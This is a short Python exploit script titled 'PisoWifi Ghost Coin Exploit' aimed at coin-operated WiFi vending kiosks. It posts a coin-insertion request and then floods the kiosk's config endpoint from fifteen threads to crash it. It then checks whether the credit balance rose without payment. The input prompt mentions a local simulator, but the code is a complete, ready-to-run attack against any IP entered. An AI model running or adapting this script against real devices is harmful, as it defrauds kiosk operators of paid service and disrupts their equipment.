#!/usr/bin/env python3
import requests
import time
import threading
from colorama import Fore, Style, init

init()

class PisoWifiExploit:
    def __init__(self, target_ip):
        self.target = f"http://{target_ip}"
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'exploit'}
    
    def get_credits(self):
        try:
            r = self.session.get(f"{self.target}/status", timeout=2)
            return r.json().get('credits', 0)
        except:
            return 0
    
    def insert_coin(self):
        try:
            r = self.session.post(
                f"{self.target}/insert_coin",
                data={'amount': '1'},
                timeout=2
            )
            return r.status_code == 200
        except:
            return False
    
    def trigger_crash(self):
        # Flood config endpoint from multiple threads
        def flood():
            try:
                self.session.get(f"{self.target}/config", timeout=0.5)
            except:
                pass
        
        threads = []
        for _ in range(15):
            t = threading.Thread(target=flood)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
    
    def exploit(self):
        print(Fore.BLUE + "\nPisoWifi Ghost Coin Exploit" + Style.RESET_ALL)
        
        # Step 1: Check initial credits
        initial = self.get_credits()
        print(Fore.WHITE + f"[*] Initial credits: P{initial}" + Style.RESET_ALL)
        
        # Step 2: Insert coin to activate slot
        if not self.insert_coin():
            print(Fore.RED + "[-] Failed to insert coin" + Style.RESET_ALL)
            return False
        print(Fore.GREEN + "[+] Coin inserted, slot active" + Style.RESET_ALL)
        
        # Step 3: Immediate crash attempt
        print(Fore.YELLOW + "[+] Triggering crash..." + Style.RESET_ALL)
        self.trigger_crash()
        
        # Step 4: Verify results
        time.sleep(5)  # Wait for recovery
        final = self.get_credits()
        
        if final > initial:
            print(Fore.GREEN + 
                f"[+] Exploit successful! Credits increased from P{initial} to P{final}" + 
                Style.RESET_ALL)
            return True
        else:
            print(Fore.RED + "[-] No ghost coins generated" + Style.RESET_ALL)
            return False

if __name__ == '__main__':
    target = input("Enter target IP (127.0.0.1 for simulator): ").strip()
    PisoWifiExploit(target).exploit()